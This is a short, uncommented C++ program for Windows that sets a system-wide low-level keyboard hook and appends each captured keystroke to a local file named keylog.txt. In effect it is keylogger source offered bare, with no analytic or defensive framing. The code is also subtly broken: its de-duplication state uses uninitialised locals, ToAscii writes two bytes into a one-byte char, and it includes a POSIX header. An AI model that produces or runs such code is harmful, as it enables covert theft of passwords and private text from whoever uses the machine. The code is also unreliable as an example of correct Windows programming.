#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

HHOOK keyboardHook;
std::ofstream outputFile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            DWORD wVirtKey = kbdStruct->vkCode;
	    DWORD wScanCode = kbdStruct->scanCode;
	    DWORD lastLoggedKey, lastCaptureTime;

DWORD currentTime = GetTickCount();

            if (wVirtKey != lastLoggedKey || 
                (currentTime - lastCaptureTime) >= 300) {
                lastLoggedKey = wVirtKey;
                lastCaptureTime = currentTime;

            outputFile.open("keylog.txt", std::ios::app);

            if (outputFile.is_open()) {
		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		char key;
		ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&key, 0);
                if (GetAsyncKeyState(wVirtKey) >= 0) {
                        outputFile << key << std::endl;
                    }
                outputFile.close();
		}
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (keyboardHook == NULL) {
        std::cerr << "unable to setup hook" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}
